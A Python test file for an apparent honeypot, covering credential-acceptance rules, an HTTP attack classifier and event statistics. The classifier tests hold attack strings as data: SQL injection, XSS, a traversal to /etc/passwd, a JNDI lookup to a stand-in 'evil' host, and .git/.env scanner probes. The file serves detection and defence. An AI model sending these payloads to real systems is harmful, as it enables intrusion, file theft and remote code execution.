from honeynest.auth import AuthPolicy
from honeynest.database import Database
from honeynest.recorder import Recorder
from honeynest.services.http import classify


def test_auth_accepts_listed_credentials():
    auth = AuthPolicy(["root:root"], accept_after_attempts=0)
    assert auth.check("1.1.1.1", "root", "root")
    assert not auth.check("1.1.1.1", "root", "toor")


def test_auth_accepts_after_n_attempts_per_ip():
    auth = AuthPolicy([], accept_after_attempts=2)
    assert not auth.check("1.1.1.1", "a", "1")
    assert not auth.check("1.1.1.1", "a", "2")
    assert auth.check("1.1.1.1", "a", "3")
    assert not auth.check("2.2.2.2", "a", "1")  # outro IP começa do zero


def test_http_classifier():
    assert classify("/item.php?id=1%27%20UNION%20SELECT%201,2--")[0] == ["sqli"]
    assert "xss" in classify("/?q=<script>alert(1)</script>")[0]
    assert "lfi" in classify("/download?file=../../etc/passwd")[0]
    assert "rce" in classify("/?x=${jndi:ldap://evil/a}")[0]
    assert "scanner" in classify("/.git/config")[0]
    assert classify("/", "Mozilla/5.0 (compatible; Nmap Scripting Engine)")[1] == "nmap"
    assert classify("/index.html") == ([], None)


def test_database_stats():
    db = Database(":memory:")
    rec = Recorder(db)
    rec.record("ssh", "login_failed", "203.0.113.1", username="root", password="123")
    rec.record("ssh", "login_failed", "203.0.113.1", username="root", password="123")
    rec.record("ssh", "login_success", "203.0.113.2", username="admin", password="admin")
    rec.record("ssh", "command", "203.0.113.2", detail="uname -a")
    rec.record("http", "http_request", "198.51.100.7", detail="GET /.env", tags=["scanner"])

    stats = db.stats()
    assert stats["totals"]["events"] == 5
    assert stats["totals"]["unique_ips"] == 3
    assert stats["totals"]["login_attempts"] == 3
    assert stats["top_credentials"][0] == {"label": "root:123", "count": 2}
    assert stats["top_commands"] == [{"label": "uname -a", "count": 1}]
    assert stats["http_attacks"] == [{"label": "scanner", "count": 1}]

    events = db.recent_events(10, service="http")
    assert len(events) == 1 and events[0]["data"]["tags"] == ["scanner"]
